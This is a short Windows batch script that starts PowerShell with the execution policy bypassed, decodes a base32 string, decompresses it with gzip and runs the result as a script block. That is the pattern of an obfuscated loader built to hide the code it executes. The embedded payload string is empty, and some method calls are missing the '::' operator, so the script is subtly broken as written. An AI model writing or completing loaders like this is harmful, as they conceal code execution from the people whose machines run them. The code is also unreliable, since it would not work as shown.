@echo off
set R=%~1
if not defined R set R=%~dp0
powershell -NoP -EP Bypass -C "$t='';$a='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';$l=New-Object Collections.Generic.List[byte];$v=0;$n=0;foreach($c in $t.ToCharArray()){$v=($v-shl 5)-bor $a.IndexOf($c);$n+=5;if($n-ge 8){$n-=8;$l.Add(($v-shr $n)-band 255);$v=$v-band((1-shl $n)-1)}};$m=[IO.MemoryStream]new($l.ToArray());$g=[IO.Compression.GZipStream]new($m,[IO.Compression.CompressionMode]0);$s=[IO.StreamReader]new($g);&([scriptblock]Create($s.ReadToEnd()))"
pause
